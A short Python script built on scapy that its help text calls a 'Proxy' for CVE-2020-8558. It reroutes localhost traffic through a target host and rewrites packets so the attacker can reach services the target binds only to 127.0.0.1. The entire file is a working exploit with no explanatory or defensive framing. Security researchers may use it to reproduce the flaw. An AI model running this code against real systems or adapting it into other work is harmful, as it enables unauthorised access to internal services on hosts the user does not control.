#! /usr/bin/env python3

import argparse

from scapy.all import *

def mangle(pkt):
    if pkt.haslayer(IP):
        # Duplicate the packets of interest, but redirected to remote localhost
        if pkt[IP].dst == args.fakedestination:
            pkt[IP].dst = "127.0.0.1"
            pkt[IP].chksum = None
            if pkt.haslayer(TCP): pkt[IP][TCP].chksum = None
            if pkt.haslayer(UDP): pkt[IP][UDP].chksum = None
            pkt[Ether].dst = targetmac
            pkt[Ether].src = hostmac
            #print("mangled out: "+repr(pkt))
            sendp(pkt,iface = targetiface,verbose=False)
        if pkt[IP].src == "127.0.0.1":
            pkt[IP].src = args.fakedestination
            pkt[IP].chksum = None
            if pkt.haslayer(TCP): pkt[IP][TCP].chksum = None
            if pkt.haslayer(UDP): pkt[IP][UDP].chksum = None
            #print("mangled in: "+repr(pkt))
            send(pkt[IP],verbose=False)
    return None

########################################
# Setup

parser = argparse.ArgumentParser(description='"Proxy" for CVE-2020-8558')
parser.add_argument('--fakedestination', type=str, help='An arbitrary, unresponsive IP address. Defaults to 198.51.100.1.', default="198.51.100.1" )
parser.add_argument('target', type=str , help='Vulnerable host on which to access localhost services.')
args = parser.parse_args()

conf.L3socket=L3RawSocket
conf.route.add(host="127.0.0.1",gw=args.target,metric=0)
targetiface, outip, outgw = conf.route.route("127.0.0.1")
targetmac=getmacbyip(args.target)
hostmac=get_if_hwaddr(targetiface)

sniff(prn=mangle, filter="host "+args.fakedestination+" or host 127.0.0.1", store=0, iface=targetiface)
